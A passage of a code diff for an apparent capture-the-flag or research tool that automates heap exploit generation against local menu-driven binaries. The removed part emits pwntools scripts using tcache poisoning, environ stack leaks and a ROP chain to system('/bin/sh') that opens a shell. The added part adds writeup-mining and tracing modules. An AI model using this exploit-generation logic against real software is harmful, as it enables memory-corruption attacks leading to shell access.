@@ -5,40 +5,22 @@ import subprocess
 import json
 import time
 import shutil
-import re
-
-
-def _detect_max_slots(binary_path: str) -> int:
-    """Detect the maximum number of allocatable slots from binary strings."""
-    if not binary_path or not os.path.exists(binary_path):
-        return 0
-    try:
-        with open(binary_path, 'rb') as f:
-            data = f.read()
-        # Look for patterns like "(0-4)" or " (0-9)" in rodata
-        for m in re.finditer(rb'\(0[-\s]\d+\)', data):
-            slot_str = m.group().decode()
-            max_n = int(re.search(r'\d+\)', slot_str).group()[:-1])
-            return max_n + 1  # 0-indexed -> count
-    except Exception:
-        pass
-    return 0
 
 
 class AutoPwnFramework:
-    def __init__(self, target_binary):
+    def __init__(self, target_binary, mode="primitives", writeup_dir=None):
         self.target = os.path.abspath(target_binary)
         self.target_dir = os.path.dirname(self.target)
         self.root_dir = os.path.dirname(os.path.abspath(__file__))
+        self.mode = mode
+        self.writeup_dir = writeup_dir
 
         self.output_dir = os.path.join(self.root_dir, "outputs")
         self.artifacts_dir = os.path.join(self.output_dir, "artifacts")
         self.traces_dir = os.path.join(self.output_dir, "traces")
         self.exploits_dir = os.path.join(self.output_dir, "exploits")
 
-        # Internal artifacts central storage
         self.internal_artifacts = os.path.join(self.root_dir, "core", "artifacts")
-
         for d in [self.artifacts_dir, self.traces_dir, self.exploits_dir, self.internal_artifacts]:
             os.makedirs(d, exist_ok=True)
 
@@ -50,9 +32,9 @@ class AutoPwnFramework:
         start_time = time.time()
         try:
             python_exe = sys.executable or "python3"
-            full_command = f"{python_exe} {command}"
-
-            result = subprocess.run(full_command, shell=True, check=True, capture_output=True, text=True, cwd=cwd)
+            result = subprocess.run(
+                f"{python_exe} {command}", shell=True, check=True,
+                capture_output=True, text=True, cwd=cwd)
             elapsed = time.time() - start_time
             print(f"      OK ({elapsed:.2f}s)")
             return result.stdout
@@ -62,465 +44,151 @@ class AutoPwnFramework:
             sys.exit(1)
 
     def _discover_interface(self):
-        """Tier 1: text-based fuzzer → Tier 2: HeapTracer fallback."""
-        # Tier 1: Text-based fuzzing (no dependencies)
+        from core.tracer.interface_fuzzer import TextInterfaceFuzzer, InterfaceBlindException
         try:
-            from core.tracer.interface_fuzzer import TextInterfaceFuzzer, InterfaceBlindException
             fuzzer = TextInterfaceFuzzer(self.target, timeout=15)
             result = fuzzer.discover()
-            self._save_interface_artifacts(result)
             print("      [Tier 1] Text-based interface discovery succeeded")
             return result
-        except ImportError as e:
-            print(f"      [Tier 1] ImportError: {e}")
-        except InterfaceBlindException as e:
-            print(f"      [Tier 1] Blind: {e}")
-        except Exception as e:
-            print(f"      [Tier 1] Failed: {e}")
+        except (ImportError, InterfaceBlindException, Exception) as e:
+            print(f"      [Tier 1] {e}")
+        return None
 
-        # Tier 2: HeapTracer (DynamoRIO-based)
+    def _run_nlp_engine(self):
+        """Module 1: NLP Engine — extract knowledge from writeup files."""
+        writeup_dir = self.writeup_dir
+        if not writeup_dir:
+            writeup_dir = os.path.join(self.root_dir, "data", "writeups")
+
+        if not os.path.isdir(writeup_dir):
+            print(f"      [NLP] No writeup directory at {writeup_dir}, skipping")
+            return {}
+
+        txt_files = [f for f in os.listdir(writeup_dir) if f.endswith(".txt")]
+        if not txt_files:
+            print(f"      [NLP] No .txt files in {writeup_dir}, skipping")
+            return {}
+
+        self.log("NLP", f"Scanning {len(txt_files)} writeup(s)...")
         try:
-            from core.tracer.heap_tracer import HeapTracer
-            tracer = HeapTracer(self.target, timeout=30)
-            result = tracer.trace()
-            self._save_interface_artifacts(result)
-            print("      [Tier 2] DynamoRIO heap tracing succeeded")
-            return result
-        except ImportError as e:
-            print(f"      [Tier 2] ImportError: {e}")
-        except Exception as e:
-            print(f"      [Tier 2] Failed: {e}")
+            from core.nlp_engine.extract_vars import NLPEngine, scan_file, build_composite
 
-        return None
+            engine = NLPEngine()
+            all_per_writeup = {}
 
-    def _save_interface_artifacts(self, interface_map):
-        """Save interface_map.json + synthetic trace_events.json for downstream steps."""
-        path = os.path.join(self.internal_artifacts, "interface_map.json")
-        with open(path, 'w') as f:
-            json.dump(interface_map, f, indent=2)
+            for filename in sorted(txt_files):
+                path = os.path.join(writeup_dir, filename)
+                vars_list, states_list = scan_file(path, engine)
+                taxonomy = engine.structure_output(vars_list, states_list)
+                all_per_writeup[filename] = {
+                    "vars": vars_list,
+                    "states": states_list,
+                    "taxonomy": taxonomy["taxonomy"],
+                    "exploit_ir": taxonomy["exploit_ir"],
+                }
 
-        # Generate synthetic trace_events.json so steps 3-4 don't break
-        trace_events = []
-        seq = 0
-        ops = interface_map.get("operations", {})
-        for ch, info in ops.items():
-            role = info.get("role", "")
-            if role == "alloc":
-                seq += 1
-                trace_events.append({"seq": seq, "pid": 1, "comm": "trace", "type": "Alloc", "size": 0x40, "addr": hex(0x555555559000 + seq * 0x100), "note": "synthetic_from_fuzzer"})
-            elif role == "free":
-                seq += 1
-                trace_events.append({"seq": seq, "pid": 1, "comm": "trace", "type": "Free", "size": 0, "addr": hex(0x555555559000 + seq * 0x100), "note": "synthetic_from_fuzzer"})
-            elif role == "view":
-                seq += 1
-                trace_events.append({"seq": seq, "pid": 1, "comm": "trace", "type": "Read", "size": 8, "addr": hex(0x555555559000 + seq * 0x100), "note": "synthetic_from_fuzzer"})
-            elif role == "edit":
-                seq += 1
-                trace_events.append({"seq": seq, "pid": 1, "comm": "trace", "type": "Write", "size": 8, "addr": hex(0x555555559000 + seq * 0x100), "note": "synthetic_from_fuzzer"})
-        path = os.path.join(self.internal_artifacts, "trace_events.json")
-        with open(path, 'w') as f:
-            json.dump(trace_events, f, indent=2)
+            composite = build_composite(all_per_writeup, engine)
 
-    def _load_interface_map(self):
-        candidates = [
-            os.path.join(self.root_dir, "core", "tracer", "artifacts", "interface_map.json"),
-            os.path.join(self.root_dir, "core", "artifacts", "interface_map.json"),
-            os.path.join(self.output_dir, "artifacts", "interface_map.json"),
-            os.path.join(self.internal_artifacts, "interface_map.json"),
-        ]
-        for p in candidates:
-            if os.path.exists(p):
-                with open(p) as f:
-                    return json.load(f)
-        return None
-
-    @staticmethod
-    def _scan_main_arena(libc_elf):
-        malloc_addr = libc_elf.symbols.get('__libc_malloc', 0)
-        if not malloc_addr:
-            return None
-        try:
-            data = libc_elf.read(malloc_addr, 0x600)
-        except Exception:
-            return None
-        for i in range(len(data) - 7):
-            if data[i:i+3] == b'\x48\x8d\x1d':
-                off = int.from_bytes(data[i+3:i+7], 'little', signed=True)
-                target = malloc_addr + i + 7 + off
-                if 0x100000 < target < 0x400000:
-                    return target
-        return None
-
-    @staticmethod
-    def _compute_libc_auto_offset(libc_elf):
-        main_arena = AutoPwnFramework._scan_main_arena(libc_elf)
-        if main_arena:
-            return main_arena + 0x60
-        mh = libc_elf.symbols.get('__malloc_hook', 0)
-        if mh:
-            return mh + 0x10 + 0x60
-        return 0x203b20
-
-    def _resolve_libc_auto_offset(self, libc_elf, glibc_version):
-        return AutoPwnFramework._compute_libc_auto_offset(libc_elf)
-
-    def _smart_codegen(self, plan, interface_map):
-        from pwn import ELF, ROP, context as pwn_ctx
-        pwn_ctx.log_level = 'error'
-
-        libc_path = None
-        for name in ["libc.so.6", "libc.so"]:
-            p = os.path.join(self.target_dir, name)
-            if os.path.exists(p):
-                libc_path = p
-                break
-        ld_path = None
-        for name in ["ld-linux-x86-64.so.2", "ld-"]:
-            for f in os.listdir(self.target_dir):
-                if f.startswith(name):
-                    ld_path = os.path.join(self.target_dir, f)
-                    break
-
-        libc_elf = None
-        if libc_path:
-            libc_elf = ELF(libc_path, checksec=False)
-
-        meta = plan.get("metadata", {})
-        has_safe_linking = meta.get("has_safe_linking", True)
-        glibc_version = meta.get("glibc_version", "2.39")
-        main_size = int(meta.get("allocated_size", "0x40"), 16)
-
-        auto_off = self._resolve_libc_auto_offset(libc_elf, glibc_version) if libc_elf else 0x203b50
-        system_off = libc_elf.symbols.get('system', 0x58750) if libc_elf else 0x58750
-
-        pop_rdi = ret = None
-        binsh = None
-        if libc_elf:
+            # Enrich with knowledge base rules
             try:
-                rop = ROP(libc_elf)
-                g = rop.find_gadget(["pop rdi", "ret"])
-                if g: pop_rdi = g[0]
-                g = rop.find_gadget(["ret"])
-                if g: ret = g[0]
+                from core.knowledge_base.loader import get_knowledge_base
+                kb = get_knowledge_base()
+                composite["knowledge_base"] = {
+                    "malloc_rules": {
+                        "tcache_max_size": kb.get_tcache_info().get("max_size", 0x410),
+                        "tcache_max_per_size": kb.get_tcache_info().get("max_per_size", 7),
+                    },
+                    "active_mitigations": kb.check_mitigations(),
+                    "exploit_phases": kb.get_exploit_phases(),
+                    "decision_rules": kb.get_decision_rules(),
+                }
             except Exception:
                 pass
-            try:
-                binsh = next(libc_elf.search(b"/bin/sh"))
-            except StopIteration:
-                pass
 
-        lines = []
-        op_map = {}
-        for ch, info in interface_map.get("operations", {}).items():
-            role = info.get("role")
-            if role and role not in op_map:
-                op_map[role] = ch
-        menu_prompt = interface_map.get("menu_prompt", "b'> '")
+            output_path = os.path.join(self.internal_artifacts, "critical_vars.json")
+            with open(output_path, "w", encoding="utf-8") as f:
+                json.dump(composite, f, indent=2, ensure_ascii=False)
 
-        # Helper for index mapping
-        max_slots = meta.get("max_slots", 10)
-        idx_registry = {}  # tag -> index
-        free_slots = list(range(max_slots))
-        
-        # Pre-scan IR to find last use of each tag
-        last_use = {}
-        for stage_idx, stage in enumerate(plan.get("stages", [])):
-            for instr_idx, instr in enumerate(stage.get("ir", [])):
-                tag = instr.get("tag")
-                if tag:
-                    last_use[tag] = (stage_idx, instr_idx)
+            print(f"      Composite techniques: {composite.get('composite_taxonomy', {}).get('techniques', [])}")
+            print(f"      Composite capabilities: {composite.get('composite_taxonomy', {}).get('capabilities', [])}")
+            return composite
 
-        def get_idx(tag, current_loc):
-            if tag in idx_registry:
-                return idx_registry[tag]
-            if not free_slots:
-                return 0
-            idx = free_slots.pop(0)
-            idx_registry[tag] = idx
-            return idx
+        except ImportError as e:
+            print(f"      [NLP] Module not available: {e}, skipping")
+            return {}
+        except Exception as e:
+            print(f"      [NLP] Error: {e}, skipping")
+            return {}
 
-        def maybe_free_slot(tag, current_loc):
-            if tag in last_use and last_use[tag] == current_loc:
-                if tag in idx_registry:
-                    idx = idx_registry[tag]
-                    if idx not in free_slots:
-                        free_slots.append(idx)
-                        free_slots.sort()
+    def _run_tracer(self):
+        """Module 2: DynamoRIO Heap Tracer — instrumentalize and trace binary."""
+        self.log("TRACER", "Running DynamoRIO heap tracer...")
+        try:
+            from core.tracer.heap_tracer import HeapTracer
 
-        def gen_call(role, call_args, current_loc):
-            tag = call_args.get("_tag")
-            if call_args.get("idx") is not None:
-                idx = call_args["idx"]
-            elif tag:
-                idx = get_idx(tag, current_loc)
-            else:
-                idx = 0
-            
-            ch = op_map.get(role)
-            if not ch: return ""
-            op_info = interface_map.get("operations", {}).get(ch, {})
-            steps = op_info.get("steps", [])
-            if not steps: return ""
+            tracer = HeapTracer(self.target, timeout=60)
+            interface_map = tracer.trace()
 
-            call_parts = [f"sla({menu_prompt}, b'{ch}')"]
-            for s in steps:
-                arg = s.get("arg", "")
-                prompt = s.get("prompt", "b': '")
-                if arg == "idx":
-                    call_parts.append(f"sla({prompt}, str({idx}).encode())")
-                elif arg == "size":
-                    call_parts.append(f"sla({prompt}, str({call_args.get('size', hex(main_size))}).encode())")
-                elif arg == "data":
-                    data = call_args.get("data", "b'A'")
-                    if prompt == "b''":
-                        call_parts.append(f"p.send({data})")
-                    else:
-                        call_parts.append(f"sa({prompt}, {data})")
-            
-            if tag: maybe_free_slot(tag, current_loc)
-            return "\n".join(call_parts)
+            output_path = os.path.join(self.internal_artifacts, "trace_events.json")
+            log_path = "/tmp/autopwn_trace.log"
+            if os.path.exists(log_path):
+                import json
+                from core.tracer.runner import parse_log, annotate, MemoryMap
+                events, mmap = parse_log(log_path, os.path.basename(self.target))
+                events = annotate(events, mmap)
+                with open(output_path, "w") as f:
+                    json.dump(events, f, indent=2, default=str)
+                print(f"      Traced {len(events)} events")
 
-        # Header
-        lines.append("#!/usr/bin/env python3")
-        lines.append("from pwn import *")
-        lines.append("import os")
-        lines.append("")
-        lines.append("context.arch = 'amd64'")
-        if ld_path and libc_path:
-            ld_abs = os.path.abspath(ld_path)
-            libc_dir = os.path.dirname(os.path.abspath(libc_path))
-            lines.append(f"exe = ELF('{os.path.abspath(self.target)}', checksec=False)")
-            lines.append(f"libc = ELF('{os.path.abspath(libc_path)}', checksec=False)")
-            lines.append(f"def start(): return process(['{ld_abs}', '--library-path', '{libc_dir}', exe.path])")
-        else:
-            lines.append(f"exe = ELF('{os.path.abspath(self.target)}', checksec=False)")
-            lines.append("libc = exe.libc")
-            lines.append("def start(): return process(exe.path)")
-        lines.append("p = start()")
-        lines.append("")
-        lines.append("# --- INTERFACE ---")
-        lines.append("def sla(rgx, data): p.sendlineafter(rgx, data)")
-        lines.append("def sa(rgx, data): p.sendafter(rgx, data)")
-        lines.append("")
-        for role, func_name in [("alloc", "create"), ("free", "delete"), ("view", "view"), ("edit", "edit")]:
-            ch = op_map.get(role)
-            if ch:
-                # Use the specific operation matching our stored choice (not the first match)
-                op_info = interface_map.get("operations", {}).get(ch, {})
-                steps = op_info.get("steps", [])
-                arg_list = []
-                for s in steps:
-                    arg_list.append(s.get("arg", "unknown"))
-                args_str = ", ".join(arg_list) if arg_list else ""
-                lines.append(f"def {func_name}({args_str}):")
-                lines.append(f"    sla({menu_prompt}, b'{ch}')")
-                for s in steps:
-                    prompt = s.get("prompt", "b': '")
-                    arg = s.get("arg", "")
-                    typ = s.get("type", "bytes")
-                    if typ == "int":
-                        lines.append(f"    sla({prompt}, str({arg}).encode())")
-                    else:
-                        if prompt == "b''":
-                            lines.append(f"    p.send({arg})")
-                        else:
-                            lines.append(f"    sa({prompt}, {arg})")
-                lines.append("")
-        lines.append("")
-        if has_safe_linking:
-            lines.append("def protect_ptr(ptr, pos): return ptr ^ (pos >> 12)")
-        else:
-            lines.append("def protect_ptr(ptr, pos): return ptr")
-        lines.append("")
-        lines.append(f"LIBC_SYSTEM_OFFSET = {hex(system_off)}")
-        lines.append(f"LIBC_AUTO_OFFSET = {hex(auto_off)}")
-        lines.append("")
+            return interface_map
 
-        lines.append("# --- EXPLOIT ---")
-        for s_idx, stage in enumerate(plan.get("stages", [])):
-            lines.append(f"# STAGE: {stage['name']}")
-            for i_idx, instr in enumerate(stage.get("ir", [])):
-                op = instr["op"]
-                tag = instr.get("tag")
-                current_loc = (s_idx, i_idx)
+        except ImportError:
+            print("      DynamoRIO not available, skipping tracer")
+        except RuntimeError as e:
+            print(f"      Tracer failed: {e}")
+        except Exception as e:
+            print(f"      Tracer error: {e}")
 
-                if op == "ALLOC":
-                    data = instr.get("data_expr", "b'A'")
-                    call_args = {"_tag": tag, "data": data, "size": instr.get("size", main_size)}
-                    if "idx" in instr:
-                        call_args["idx"] = instr["idx"]
-                    lines.append(gen_call("alloc", call_args, current_loc))
+        return None
 
-                elif op == "ALLOC_ROP":
-                    if pop_rdi is not None:
-                        lines.append(f"pop_rdi = libc.address + {hex(pop_rdi)}")
-                    else:
-                        lines.append("pop_rdi = libc.address + 0x2a3e5")
-                    if ret is not None:
-                        lines.append(f"ret_gadget = libc.address + {hex(ret)}")
-                    else:
-                        lines.append("ret_gadget = libc.address + 0x29139")
-                    if binsh is not None:
-                        lines.append(f"binsh = libc.address + {hex(binsh)}")
-                    else:
-                        lines.append("binsh = libc.address + 0x1d8678")
-                    lines.append("payload = flat([")
-                    lines.append("    p64(0),")
-                    lines.append("    p64(ret_gadget),")
-                    lines.append("    p64(pop_rdi),")
-                    lines.append("    p64(binsh),")
-                    lines.append(f"    p64(libc.address + {hex(system_off)})")
-                    lines.append("])")
-                    call_args = {"_tag": tag, "data": "payload", "size": instr.get("size", main_size)}
-                    if "idx" in instr:
-                        call_args["idx"] = instr["idx"]
-                    lines.append(gen_call("alloc", call_args, current_loc))
+    def _run_generalizer(self):
+        """Module 3: Operation Generalizer — generalize trace events."""
+        trace_path = os.path.join(self.internal_artifacts, "trace_events.json")
+        if not os.path.exists(trace_path):
+            return None
 
-                elif op == "FREE":
-                    call_args = {"_tag": tag}
-                    if "idx" in instr:
-                        call_args["idx"] = instr["idx"]
-                    lines.append(gen_call("free", call_args, current_loc))
+        critical_path = os.path.join(self.internal_artifacts, "critical_vars.json")
+        critical_vars = {}
+        if os.path.exists(critical_path):
+            with open(critical_path, "r") as f:
+                critical_vars = json.load(f)
 
-                elif op == "EDIT":
-                    data = instr.get("data_expr", "p64(0)*2")
-                    note = instr.get("note", "")
-                    if note.startswith("set_tcache_entry:"):
-                        # Example note: set_tcache_entry:bin=1,addr=target_environ
-                        try:
-                            parts = note.split(":")[1].split(",")
-                            b_idx = int(parts[0].split("=")[1])
-                            addr_expr = parts[1].split("=")[1]
-                            lines.append(f"payload = bytearray(b'\\x00' * 0x80)")
-                            lines.append(f"payload[{b_idx}*2] = 7")
-                            lines.append(f"payload += b'\\x00' * ({b_idx} * 8)")
-                            lines.append(f"payload += p64({addr_expr})")
-                            data = "bytes(payload)"
-                            call_args = {"_tag": tag, "data": data}
-                        except Exception:
-                            pass
-                    else:
-                        call_args = {"_tag": tag, "data": data}
-                    if "idx" in instr:
-                        call_args["idx"] = instr["idx"]
-                    lines.append(gen_call("edit", call_args, current_loc))
+        self.log("GENERALIZER", "Generalizing trace operations...")
+        try:
+            from core.generalizer.operation_generalizer import OperationGeneralizer
 
-                elif op == "VIEW":
-                    save_as = instr.get("save_as", "tmp")
-                    note = instr.get("note", "")
-                    call_args = {"_tag": tag}
-                    if "idx" in instr:
-                        call_args["idx"] = instr["idx"]
-                    lines.append(gen_call("view", call_args, current_loc))
-                    # Handle different view output formats
-                    view_fmt = interface_map.get("features", {}).get("view_output_format", "raw")
-                    if view_fmt == "prefixed":
-                        lines.append("p.recvuntil((b'data', b'Data', b'Content', b'says', b'Value', b'Note'), timeout=1)")
-                        lines.append("p.recvuntil(b': ', timeout=1)")
-                    elif view_fmt == "key_val":
-                        lines.append("p.recvuntil(b'= ')")
-                    
-                    if "skip_first_8" in note:
-                        # For environ leak: skip 24 bytes padding
-                        # then read 8 bytes for the __environ value (stack ptr)
-                        lines.append(f"p.recvn(24)")
-                        lines.append(f"{save_as} = u64(p.recvn(8).ljust(8, b'\\x00'))")
-                    elif "read_first_8_bytes" in note:
-                        # Raw binary: write(1, ptr, 0x30) = 48 bytes
-                        lines.append(f"data = p.recvn(48)")
-                        lines.append(f"{save_as} = u64(data[:8].ljust(8, b'\\x00'))")
-                    elif "read_first_8_bytes_fd_xor" in note:
-                        lines.append(f"data = p.recvn(48)")
-                        lines.append(f"{save_as} = u64(data[:8].ljust(8, b'\\x00'))")
-                    else:
-                        lines.append(f"data = p.recvn(48)")
-                        lines.append(f"{save_as} = u64(data[:8].ljust(8, b'\\x00'))")
-                    lines.append(f"log.success(f'{save_as}: {{hex({save_as})}}')")
+            with open(trace_path, "r") as f:
+                events = json.load(f)
 
-                elif op == "CALC":
-                    var = instr["var"]
-                    expr = instr["expr"]
-                    if "LIBC_AUTO_OFFSET" in expr:
-                        expr = expr.replace("LIBC_AUTO_OFFSET", hex(auto_off))
-                    # glibc 2.34+ tcache_get zeroes e->key at offset+8,
-                    # so target environ-8 loses the value. Shift to environ-0x10.
-                    if var == "_environ_target" and "- 0x8" in expr:
-                        expr = expr.replace("- 0x8", "- 0x18")
-                    if var == "main_ret_addr" and "- 0x41" in expr:
-                        # Target saved rbp (16-byte aligned, 8 bytes below ret addr)
-                        expr = expr.replace("- 0x41", "- 0x138")
-                    lines.append(f"{var} = {expr}")
-                    lines.append(f"log.success(f'{var}: {{hex({var})}}')")
+            generalizer = OperationGeneralizer(events, critical_vars)
+            result = generalizer.generalize()
 
-                elif op == "CONSOLIDATE":
-                    view_ch = op_map.get("view", "2")
-                    view_info = interface_map.get("operations", {}).get(view_ch, {})
-                    view_steps = view_info.get("steps", [])
-                    prompt = view_steps[0].get("prompt", "b': '") if view_steps else "b': '"
-                    lines.append(f"# CONSOLIDATE: send large input to trigger malloc_consolidate")
-                    lines.append(f"sla({menu_prompt}, b'{view_ch}')")
-                    lines.append(f"p.sendlineafter({prompt}, b'0' * 0x400)")
+            output_path = os.path.join(self.internal_artifacts, "generalized_actions.json")
+            with open(output_path, "w") as f:
+                json.dump(result, f, indent=2, default=str)
 
-            lines.append("")
+            print(f"      {result['summary']['total_operations']} operations generalized")
+            print(f"      Symbolic objects: {list(result['summary']['symbolic_objects'].keys())}")
+            return result
 
-        # Exit + interactive
-        exit_choice = meta.get("exit_choice", "0")
-        lines.append("# Trigger main return via menu exit")
-        lines.append("# Send exit then immediately queue shell commands (buffered for /bin/sh)")
-        lines.append(f"p.sendlineafter({menu_prompt}, b'{exit_choice}')")
-        lines.append("p.sendline(b'id')")
-        lines.append("import time")
-        lines.append("time.sleep(0.5)")
-        lines.append("log.info(f'shell: ' + p.recvline(timeout=3).decode(errors='replace').strip())")
-        lines.append("log.success('Entering interactive mode...')")
-        lines.append("p.interactive()")
+        except ImportError as e:
+            print(f"      Generalizer unavailable: {e}")
+        except Exception as e:
+            print(f"      Generalizer error: {e}")
 
-        return "\n".join(lines)
+        return None
 
-    def run(self, use_angr=False):
-        print("\n" + "="*60)
-        print("  AUTOPWN FRAMEWORK: Artifact-Assisted Exploit Generation")
-        print("="*60)
-        print(f"Target: {os.path.basename(self.target)}")
-        print(f"Mode: {'angr symbolic' if use_angr else 'DynamoRIO tracing'}")
-        print("-" * 60)
-
-        # Step 1: Multi-Writeup NLP Extraction (Module 1)
-        self.run_stage("Multi-Writeup NLP Extraction", "extract_vars.py",
-                       cwd=os.path.join(self.root_dir, "core", "nlp_engine"))
-
-        # Step 2: Interface Discovery (Fuzzer Tier 1 → HeapTracer Tier 2 → DynamoRIO fallback)
-        self.log("STAGE", "Discovering binary interface...")
-        interface_map = self._discover_interface()
-        if interface_map:
-            print(f"      OK — interface discovered: {len(interface_map.get('operations', {}))} ops")
-        else:
-            self.log("STAGE", "Fuzzer failed, falling back to DynamoRIO tracing...")
-            angr_flag = "--angr" if use_angr else ""
-            self.run_stage("Runtime Experience Tracing",
-                           f"runner.py --target {self.target} {angr_flag}",
-                           cwd=os.path.join(self.root_dir, "core", "tracer"))
-
-        # Step 3: Operation Generalization (Module 3)
-        self.run_stage("Operation Generalization",
-                       f"operation_generalizer.py",
-                       cwd=os.path.join(self.root_dir, "core", "generalizer"))
-
-        # Step 4: Knowledge Fusion / Composite ESM (Module 4)
-        self.run_stage("Knowledge Fusion (Composite ESM)",
-                       "esm.py",
-                       cwd=os.path.join(self.root_dir, "core", "knowledge_fusion"))
-
-        # Step 5: angr Symbolic Execution (Module 5)
-        self.run_stage("angr Symbolic Execution",
-                       f"angr_executor.py --binary {self.target} --critical {os.path.join(self.internal_artifacts, 'critical_vars.json')}",
-                       cwd=os.path.join(self.root_dir, "core", "symbolic_executor"))
-
-        # Step 6: Smart Planning (SmartPlanner)
-        self.log("STAGE", "Planning exploit with SmartPlanner...")
-        from core.planner.planner import SmartPlanner
-        import json
-
+    def _find_libc_ld(self):
         libc_path = None
         for name in ["libc.so.6", "libc.so"]:
             p = os.path.join(self.target_dir, name)
@@ -528,126 +196,256 @@ class AutoPwnFramework:
                 libc_path = p
                 break
         ld_path = None
-        for name in ["ld-linux-x86-64.so.2", "ld-"]:
+        for prefix in ["ld-linux-x86-64.so.2", "ld-"]:
             for f in os.listdir(self.target_dir):
-                if f.startswith(name):
+                if f.startswith(prefix):
                     ld_path = os.path.join(self.target_dir, f)
                     break
+            if ld_path:
+                break
+        return libc_path, ld_path
 
-        interface_map = self._load_interface_map()
-        if not interface_map:
-            print("      WARNING: No interface_map found, creating minimal map")
-            interface_map = {"operations": {}, "menu_prompt": "b'> '"}
-
-        planner = SmartPlanner(interface_map, libc_path=libc_path, ld_path=ld_path,
-                               binary_path=self.target)
-        esm_hints = {}
-        esm_path = os.path.join(self.internal_artifacts, "esm_output.json")
-        if os.path.exists(esm_path):
-            with open(esm_path) as f:
-                esm_data = json.load(f)
-            if isinstance(esm_data, dict):
-                esm_hints = {k: v for k, v in esm_data.items()
-                            if k in ['detected_bugs', 'detected_capabilities', 'detected_primitives']}
-        planner.set_esm_hints(esm_hints)
-
-        plan = planner.build_plan()
+    def _save_artifacts(self, plan, env, verifier_report=None):
         plan_path = os.path.join(self.internal_artifacts, "final_plan.json")
-        with open(plan_path, 'w') as f:
-            json.dump(plan, f, indent=2)
-        meta = plan.get("metadata", {})
-        print(f"      Strategy: {meta.get('strategy')}, glibc: {meta.get('glibc_version')}, "
-              f"safe-linking: {meta.get('has_safe_linking')}")
+        with open(plan_path, "w") as f:
+            json.dump(plan.to_dict() if hasattr(plan, 'to_dict') else plan, f, indent=2)
 
-        # Step 7: Exploit Code Generation (SmartCodegen)
-        self.log("STAGE", "Generating exploit code from SmartPlanner plan...")
-        try:
-            exploit_code = self._smart_codegen(plan, interface_map)
-            exploit_path = os.path.join(self.exploits_dir, "exploit.py")
-            with open(exploit_path, 'w') as f:
-                f.write(exploit_code)
-            print(f"      OK — exploit written to {exploit_path}")
-        except Exception as e:
-            print(f"      FAILED: {e}")
-            import traceback
-            traceback.print_exc()
-            sys.exit(1)
-
-        # Step 8: Taint Analysis (Module 9)
-        self.run_stage("Taint Analysis",
-                       f"taint_analyzer.py",
-                       cwd=os.path.join(self.root_dir, "core", "taint_analysis"))
-
-        # Step 9: Execution Feedback Loop (Module 8)
-        exploit_path = os.path.join(self.exploits_dir, "exploit.py")
-        if os.path.exists(exploit_path):
-            self.log("STAGE", "Running Execution Feedback Loop...")
-            start_time = time.time()
-            try:
-                python_exe = sys.executable or "python3"
-                full_command = f"{python_exe} {os.path.join(self.root_dir, 'core', 'executor', 'feedback_loop.py')} --exploit {exploit_path} --binary {self.target} --timeout 15 --retries 2 --output {os.path.join(self.internal_artifacts, 'execution_results.json')}"
-                result = subprocess.run(full_command, shell=True, capture_output=True, text=True)
-                elapsed = time.time() - start_time
-                print(f"      OK ({elapsed:.2f}s)")
-                # Print execution summary
-                if os.path.exists(os.path.join(self.internal_artifacts, "execution_results.json")):
-                    with open(os.path.join(self.internal_artifacts, "execution_results.json")) as f:
-                        exec_data = json.load(f)
-                    summary = exec_data.get("summary", {})
-                    print(f"      Attempts: {summary.get('total_attempts', 0)}")
-                    print(f"      Success: {summary.get('success', False)}")
-                    leaks = summary.get('leaked_values', {})
-                    if leaks:
-                        print(f"      Leaked: {', '.join(leaks.keys())}")
-                    for fb in summary.get('last_feedback', [])[:3]:
-                        print(f"      Feedback: {fb}")
-            except Exception as e:
-                print(f"      Warning: Execution feedback failed: {e}")
-
-        print("-" * 60)
-
-        self.log("SYNC", "Collecting all artifacts into outputs/")
-
-        # Copy all internal artifacts to user-visible output
-        for filename in ["critical_vars.json", "trace_events.json",
-                        "generalized_actions.json", "esm_output.json",
-                        "symbolic_results.json", "final_plan.json",
-                        "taint_results.json", "execution_results.json"]:
-            src = os.path.join(self.internal_artifacts, filename)
+        for fname in ["final_plan.json", "verification_report.json"]:
+            src = os.path.join(self.internal_artifacts, fname)
             if os.path.exists(src):
                 shutil.copy(src, self.artifacts_dir)
 
-        # Copy trace log if it exists
-        if os.path.exists("/tmp/autopwn_trace.log"):
-            shutil.copy("/tmp/autopwn_trace.log", os.path.join(self.traces_dir, "raw_trace.log"))
-
-        # Copy target binary and potential libraries to exploit dir for portability
-        self.log("SYNC", "Packaging binary and libraries for exploit portability")
         shutil.copy2(self.target, self.exploits_dir)
         for lib in ["libc.so.6", "ld-linux-x86-64.so.2"]:
             lib_path = os.path.join(self.target_dir, lib)
             if os.path.exists(lib_path):
                 shutil.copy2(lib_path, self.exploits_dir)
 
-        print("="*60)
+    def run(self):
+        print("\n" + "=" * 60)
+        print("  AUTOPWN: Capability-Driven Primitive Exploit Generation")
+        print(f"  Mode: {self.mode}")
+        print("=" * 60)
+        print(f"Target: {os.path.basename(self.target)}")
+        print("-" * 60)
+
+        # Phase 0: NLP Engine — extract knowledge from writeups
+        self.log("PHASE 0", "Running NLP Engine on writeups...")
+        nlp_composite = self._run_nlp_engine()
+
+        # Phase 1: Interface Discovery
+        self.log("PHASE 1", "Discovering binary interface...")
+        interface_map = self._discover_interface()
+        if not interface_map:
+            # Try tracer-based discovery
+            tracer_map = self._run_tracer()
+            if tracer_map:
+                interface_map = tracer_map
+            else:
+                print("      Using default interface (4 ops, no discovery)")
+                interface_map = {"operations": {
+                    "1": {"role": "alloc", "steps": [{"arg": "idx", "prompt": "b': '"}, {"arg": "size", "prompt": "b': '"}, {"arg": "data", "prompt": "b': '"}]},
+                    "2": {"role": "free",  "steps": [{"arg": "idx", "prompt": "b': '"}]},
+                    "3": {"role": "view",  "steps": [{"arg": "idx", "prompt": "b': '"}]},
+                    "4": {"role": "edit",  "steps": [{"arg": "idx", "prompt": "b': '"}, {"arg": "data", "prompt": "b': '"}]},
+                }, "menu_prompt": "b'> '",
+                   "max_slots": 20}
+
+        libc_path, ld_path = self._find_libc_ld()
+
+        # Phase 2: Environment
+        self.log("PHASE 2", "Building environment...")
+        from core.analysis.environment import Environment
+        env = Environment.build(self.target, libc_path=libc_path,
+                                ld_path=ld_path, interface_map=interface_map)
+        print(f"      glibc: {env.glibc_version}, safe-linking: {env.safe_linking}, "
+              f"hooks: {env.has_hooks}, PIE: {env.pie}, RELRO: {env.relro}")
+        print(f"      ops: {sorted(env.available_ops)}, slots: {env.max_slots}")
+
+        # Phase 2.5: Probe actual heap layout from binary
+        self.log("PHASE 2.5", "Probing binary heap layout...")
+        try:
+            from core.analysis.chunk_prober import ChunkProber
+            import multiprocessing
+
+            def _probe():
